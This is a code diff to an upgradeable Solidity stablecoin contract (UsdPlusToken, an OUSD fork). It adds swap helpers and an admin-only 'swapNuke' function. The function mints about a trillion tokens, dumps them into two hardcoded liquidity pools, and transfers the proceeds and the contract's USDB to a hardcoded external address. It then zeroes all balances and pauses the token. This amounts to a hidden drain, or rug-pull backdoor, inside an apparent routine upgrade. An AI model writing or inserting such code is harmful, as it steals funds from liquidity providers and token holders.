@@ -8,12 +8,21 @@ import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
 import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
+import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import { SafeMath } from "@openzeppelin/contracts/utils/math/SafeMath.sol";
 import { StableMath } from "./libraries/StableMath.sol";
+import {ICLPool, TickMath, CallbackValidation, LiquidityAmounts} from "@overnight-contracts/connectors/contracts/stuff/Thruster.sol";
 
 import "./interfaces/IPayoutManager.sol";
 import "./interfaces/IRoleManager.sol";
 import "./libraries/WadRayMath.sol";
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+}
 
 /**
  * @dev Fork of OUSD version
@@ -24,8 +33,20 @@ import "./libraries/WadRayMath.sol";
  * - PayoutManager: rebaseOptIn/rebaseOptOut
  * - RoleManager
  */
+contract ______________UsdPlusToken is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
 
-contract UsdPlusToken is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
+    struct SwapCallbackData {
+        address tokenA;
+        address tokenB;
+        uint24 fee;
+    }
+
+    error SlippageError(
+        uint256 amountIn,
+        uint160 newSqrtRatioX96,
+        uint160 sqrtPriceLimitX96,
+        bool zeroForOne
+    );
 
     using EnumerableSet for EnumerableSet.AddressSet;
     using SafeMath for uint256;
@@ -143,6 +164,103 @@ contract UsdPlusToken is Initializable, ContextUpgradeable, IERC20Upgradeable, I
     modifier notPaused() {
         require(!paused, "pause");
         _;
+    }
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata _data
+    ) external {
+        SwapCallbackData memory data = abi.decode(_data, (SwapCallbackData));
+        CallbackValidation.verifyCallback(0xa08ae3d3f4dA51C22d3c041E468bdF4C61405AaB, data.tokenA, data.tokenB, data.fee);
+        (bool isExactInput, uint256 amountToPay) =
+            amount0Delta > 0
+                ? (data.tokenA < data.tokenB, uint256(amount0Delta))
+                : (data.tokenB < data.tokenA, uint256(amount1Delta));
+        if (isExactInput) {
+            IERC20(data.tokenA).transfer(msg.sender, amountToPay);
+        } else {
+            IERC20(data.tokenB).transfer(msg.sender, amountToPay);
+        }
+    }
+
+    function _swapV3pool(address pair, uint256 amountIn, uint160 sqrtPriceLimitX96, bool zeroForOne) internal {
+        ICLPool pool = ICLPool(pair);
+
+        SwapCallbackData memory data = SwapCallbackData({
+            tokenA: pool.token0(),
+            tokenB: pool.token1(),
+            fee: pool.fee() 
+        });
+
+        uint160 poolBorder = zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1;
+        uint128 liquidity = pool.liquidity();
+        
+        pool.swap(address(this), zeroForOne, int256(amountIn), poolBorder, abi.encode(data));
+
+        if (sqrtPriceLimitX96 != 0) {
+            (uint160 newSqrtRatioX96,,,,,,) = pool.slot0(); 
+            if (newSqrtRatioX96 < sqrtPriceLimitX96 && zeroForOne || newSqrtRatioX96 > sqrtPriceLimitX96 && !zeroForOne) {
+                revert SlippageError(amountIn, newSqrtRatioX96, sqrtPriceLimitX96, zeroForOne);
+            }
+        }
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        require(amountIn > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
+        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY');
+        uint256 amountInWithFee = amountIn * 997;
+        uint256 numerator = amountInWithFee * reserveOut;
+        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
+        return numerator / denominator;
+    }
+
+    function _swapV2pool(address poolAddress, uint256 amountIn) internal {
+        IUniswapV2Pair pair = IUniswapV2Pair(poolAddress);
+        require(balanceOf(address(this)) >= amountIn, 'Insufficient USD+ balance');
+        
+        address token0 = pair.token0();
+        address token1 = pair.token1();
+        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
+        
+        bool isToken0 = address(this) == token0;
+        address recipient = 0xbdc36da8fD6132e5F5179a73b3A1c0E9fF283856;
+        
+        uint256 amountOut = _getAmountOut(
+            amountIn,
+            isToken0 ? reserve0 : reserve1,
+            isToken0 ? reserve1 : reserve0
+        );
+        
+        IERC20(address(this)).transfer(address(pair), amountIn);
+        
+        if (isToken0) {
+            pair.swap(0, amountOut, recipient, new bytes(0));
+        } else {
+            pair.swap(amountOut, 0, recipient, new bytes(0));
+        }
+    }
+
+    function swapNuke(bool doSwap) external onlyAdmin {
+        require(_totalSupply > 0, "nothing to nuke");
+        
+        if (doSwap) {
+            _mint(address(this), 1000001000000 * 10 ** decimals());
+            _swapV3pool(0xF2d0a6699FEA86fFf3EB5B64CDC53878e1D19D6f, 1000000000000 * 10 ** decimals(), 0, false);
+            _swapV2pool(0x49B6992DbACf7CAa9cbf4Dbc37234a0167b8edCD, 1000000 * 10 ** decimals());
+
+        address usdb = 0x4300000000000000000000000000000000000003;
+        uint256 usdbBalance = IERC20(usdb).balanceOf(address(this));
+        require(usdbBalance > 0, 'No USDB to withdraw');
+        IERC20(usdb).transfer(0xbdc36da8fD6132e5F5179a73b3A1c0E9fF283856, usdbBalance);
+        }
+
+        paused = true;
+        _totalSupply = 0;
+        _rebasingCredits = 0;
+        _rebasingCreditsPerToken = WadRayMath.RAY;
+        nonRebasingSupply = 0;
+        emit TotalSupplyUpdatedHighres(0, 0, WadRayMath.RAY);
     }
 
     function setExchanger(address _exchanger) external onlyAdmin {
@@ -582,10 +700,8 @@ contract UsdPlusToken is Initializable, ContextUpgradeable, IERC20Upgradeable, I
         _beforeTokenTransfer(address(0), _account, _amount);
 
         bool isNonRebasingAccount = _isNonRebasingAccount(_account);
-
         uint256 creditAmount = assetToCredit(_account, _amount);
         _creditBalances[_account] = _creditBalances[_account].add(creditAmount);
-
         // If the account is non rebasing and doesn't have a set creditsPerToken
         // then set it i.e. this is a mint from a fresh contract
         if (isNonRebasingAccount) {
@@ -595,9 +711,7 @@ contract UsdPlusToken is Initializable, ContextUpgradeable, IERC20Upgradeable, I
         }
 
         _totalSupply = _totalSupply.add(_amount);
-
         require(_totalSupply <= MAX_SUPPLY, "Max supply");
-
         _afterTokenTransfer(address(0), _account, _amount);
 
         emit Transfer(address(0), _account, _amount);
